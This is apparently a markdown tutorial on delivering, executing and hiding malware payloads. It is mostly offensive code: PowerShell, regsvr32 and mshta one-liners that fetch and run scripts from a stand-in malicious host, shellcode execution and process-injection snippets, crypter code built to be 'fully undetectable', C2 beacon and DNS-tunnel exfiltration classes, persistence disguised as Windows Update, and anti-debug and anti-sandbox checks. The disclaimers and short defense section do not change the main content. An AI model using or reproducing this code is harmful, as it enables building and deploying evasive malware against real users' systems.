# Payload Delivery và Execution Methods

⚠️ **WARNING: Educational content only! Do not use for malicious purposes!**

---

## 🚚 **Delivery Methods**

### **1. Social Engineering**
```
Email Attachments:
├── PDF with embedded executable
├── Office documents with macros
├── Archive files (ZIP, RAR) 
└── Disguised executables (.pdf.exe)

Websites:
├── Drive-by downloads
├── Fake software updates
├── Malicious ads (malvertising)
└── Watering hole attacks
```

### **2. Physical Access**
```
USB Autorun:
├── autorun.inf with malware
├── Rubber Ducky attacks
├── BadUSB firmware modification
└── HID keyboard emulation

Network Shares:
├── SMB share poisoning  
├── Printer exploitation
├── Network folder replacement
└── Admin share abuse
```

### **3. Remote Exploitation**
```
Network Services:
├── RDP brute force
├── SMB vulnerabilities (EternalBlue)
├── Web application exploits
└── Service misconfigurations

Supply Chain:
├── Compromised software updates
├── Malicious packages (npm, pip)
├── Hardware implants
└── Code signing certificate theft
```

---

## 🎭 **Execution Evasion Techniques**

### **1. Living off the Land (LoL)**
```powershell
# Use legitimate Windows tools

# PowerShell download and execute
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/script.ps1')"

# WMIC for remote execution
wmic process call create "cmd.exe /c powershell -enc <base64>"

# Rundll32 proxy execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").exec("calc.exe");close();

# Regsvr32 for scriptlet execution
regsvr32 /s /n /u /i:http://malicious.com/script.sct scrobj.dll

# MSHta for HTML application execution
mshta http://malicious.com/malicious.hta
```

### **2. Process Injection Alternatives**
```cpp
// Thread Execution Hijacking
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadId);
SuspendThread(hThread);
SetThreadContext(hThread, &maliciousContext);
ResumeThread(hThread);

// Atom Bombing
GlobalAddAtom(L"MaliciousCode");
SendMessage(hWnd, WM_SETTEXT, atom, 0);

// Process Doppelgänging  
CreateTransaction(...);
CreateFileTransacted(...);
NtCreateProcessEx(...);

// Manual DLL Mapping
ReadFile(dllFile, &dllBuffer);
VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, remoteImage, dllBuffer, dllSize);
// Manual PE fixing...
```

### **3. Fileless Execution**
```cpp
// Direct memory execution
LPVOID execMem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(execMem, shellcode, payloadSize);
((void(*)())execMem)(); // Execute shellcode directly

// Registry storage
RegSetValueEx(hKey, L"Data", 0, REG_BINARY, payload, payloadSize);
// Later retrieve and execute

// WMI Event Subscription persistence
// Store payload in WMI repository
```

---

## 🔐 **Encryption & Packing**

### **1. Payload Encryption**
```cpp
// XOR Encryption (simple)
void xorEncrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// AES Encryption (advanced)
#include <openssl/aes.h>
void aesEncrypt(unsigned char* plaintext, unsigned char* ciphertext, unsigned char* key) {
    AES_KEY aesKey;
    AES_set_encrypt_key(key, 256, &aesKey);
    AES_encrypt(plaintext, ciphertext, &aesKey);
}

// ChaCha20 (like in main project)
#include "chacha20.h"
void chachaEncrypt(uint8_t* data, size_t len, uint8_t* key, uint8_t* nonce) {
    chacha20_encrypt(data, len, key, nonce, 0);
}
```

### **2. Runtime Packers**
```
Commercial Packers:
├── UPX (Ultimate Packer for eXecutables)
├── Themida (advanced protection)
├── VMProtect (virtualization)
└── Enigma Protector

Custom Packers:
├── Self-modifying code
├── API hashing
├── Control flow obfuscation
└── Anti-debugging tricks
```

### **3. Crypters/FUD (Fully Undetectable)**
```cpp
// Multi-stage decryption
class MultiStageDecryptor {
private:
    static const int STAGES = 3;
    unsigned char keys[STAGES][32];
    
public:
    void decrypt(unsigned char* payload, size_t len) {
        // Stage 1: XOR
        for (size_t i = 0; i < len; i++) {
            payload[i] ^= keys[0][i % 32];
        }
        
        // Stage 2: ROT
        for (size_t i = 0; i < len; i++) {
            payload[i] = (payload[i] + keys[1][i % 32]) & 0xFF;
        }
        
        // Stage 3: AES
        // ... AES decryption
    }
};
```

---

## 🌐 **Remote Access & C2**

### **1. Command & Control Channels**
```cpp
// HTTP/HTTPS Communication
class HTTPBeacon {
private:
    std::string c2Server = "https://legitimate-looking-site.com";
    
public:
    void sendBeacon() {
        // Send system info to C2
        std::string data = getSystemInfo();
        httpPost(c2Server + "/api/status", data);
    }
    
    void getCommands() {
        // Receive commands from C2
        std::string response = httpGet(c2Server + "/api/tasks");
        executeCommands(response);
    }
};

// DNS Tunneling
class DNSTunnel {
public:
    void exfiltrateData(const std::string& data) {
        // Encode data in DNS queries
        std::string encoded = base64Encode(data);
        std::string query = encoded + ".tunnel.malicious.com";
        // Send DNS query...
    }
};

// Social Media C2
class TwitterC2 {
public:
    void getCommands() {
        // Check specific Twitter account for encoded commands
        std::string tweet = getLatestTweet("@innocuous_account");
        std::string command = decodeFromTweet(tweet);
        executeCommand(command);
    }
};
```

### **2. Persistence Mechanisms**
```cpp
// Registry Autorun
void addRegistryPersistence(const std::string& exePath) {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, 
                 L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                 0, KEY_WRITE, &hKey);
    RegSetValueEx(hKey, L"WindowsUpdater", 0, REG_SZ, 
                  (BYTE*)exePath.c_str(), exePath.length());
    RegCloseKey(hKey);
}

// Scheduled Task
void createScheduledTask() {
    system("schtasks /create /tn \"Windows Update Check\" /tr \"C:\\Windows\\System32\\malware.exe\" /sc daily /st 09:00");
}

// Service Installation
void installService() {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    SC_HANDLE hService = CreateService(hSCM, L"WindowsUpdateSvc", L"Windows Update Service",
                                      SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
                                      SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                                      L"C:\\Windows\\System32\\malware.exe", NULL, NULL, NULL, NULL, NULL);
}

// WMI Event Subscription
void createWMIPersistence() {
    // Complex WMI-based persistence
    // Survives system reboots and is harder to detect
}
```

---

## 🔍 **Anti-Analysis Techniques**

### **1. Anti-Debugging**
```cpp
class AntiDebug {
public:
    static bool isDebuggerPresent() {
        // Check PEB flag
        if (IsDebuggerPresent()) return true;
        
        // Check debug heap
        HANDLE hHeap = GetProcessHeap();
        DWORD heapFlags = *(DWORD*)((BYTE*)hHeap + 0x40);
        if (heapFlags & 0x00000002) return true;
        
        // Timing checks
        DWORD start = GetTickCount();
        Sleep(100);
        DWORD end = GetTickCount();
        if ((end - start) < 90) return true; // Debugger acceleration
        
        return false;
    }
    
    static void antiDebugTricks() {
        // OutputDebugString trick
        SetLastError(0);
        OutputDebugStringA("Test");
        if (GetLastError() == 0) {
            // Debugger present
            ExitProcess(0);
        }
        
        // Hardware breakpoint detection
        CONTEXT ctx;
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
        GetThreadContext(GetCurrentThread(), &ctx);
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            ExitProcess(0);
        }
    }
};
```

### **2. Anti-Sandbox**
```cpp
class AntiSandbox {
public:
    static bool isSandbox() {
        // Check CPU cores
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        if (sysInfo.dwNumberOfProcessors < 2) return true;
        
        // Check RAM
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        if (memStatus.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return true; // Less than 2GB
        
        // Check disk size
        ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes;
        GetDiskFreeSpaceEx(L"C:\\", &freeBytesAvailable, &totalNumberOfBytes, NULL);
        if (totalNumberOfBytes.QuadPart < (50ULL * 1024 * 1024 * 1024)) return true; // Less than 50GB
        
        // Check for sandbox artifacts
        if (GetModuleHandle(L"sbiedll.dll")) return true; // Sandboxie
        if (GetModuleHandle(L"dbghelp.dll")) return true; // Analysis tools
        
        return false;
    }
    
    static void evasiveSleep() {
        // Sleep for extended period to evade sandbox analysis
        Sleep(5 * 60 * 1000); // 5 minutes
        
        // Check if time actually passed (sandbox might accelerate)
        static DWORD lastTime = GetTickCount();
        DWORD currentTime = GetTickCount();
        if ((currentTime - lastTime) < (4 * 60 * 1000)) {
            ExitProcess(0); // Sandbox detected
        }
        lastTime = currentTime;
    }
};
```

---

## 📦 **Complete Evasion Pipeline**

### **Development Phase:**
1. **Code Obfuscation**: Hide strings, APIs, control flow
2. **Packing**: Encrypt/compress final binary
3. **Testing**: Check against multiple AV engines
4. **Iteration**: Modify until FUD (Fully Undetectable)

### **Delivery Phase:**
1. **Social Engineering**: Craft convincing lure
2. **Staging**: Multi-stage payload delivery
3. **Environment Checks**: Ensure real target environment
4. **Privilege Escalation**: Gain higher privileges if needed

### **Execution Phase:**
1. **Process Injection**: Use advanced injection techniques
2. **Persistence**: Establish foothold on system
3. **Defense Evasion**: Avoid detection during operation
4. **Cleanup**: Remove traces after objective completed

---

## 🛡️ **Defense Perspective**

### **Detection Strategies:**
- **Behavioral Analysis**: Monitor process behavior patterns
- **Memory Scanning**: Detect in-memory artifacts
- **Network Monitoring**: Identify C2 communications
- **Endpoint Detection**: Real-time threat hunting

### **Prevention Measures:**
- **Application Whitelisting**: Only allow known-good binaries
- **Sandboxing**: Isolate untrusted executables
- **User Training**: Educate about social engineering
- **Regular Updates**: Patch known vulnerabilities

---

*🔒 This information is provided for educational and defensive purposes only. Understanding attacker techniques helps build better defenses.*
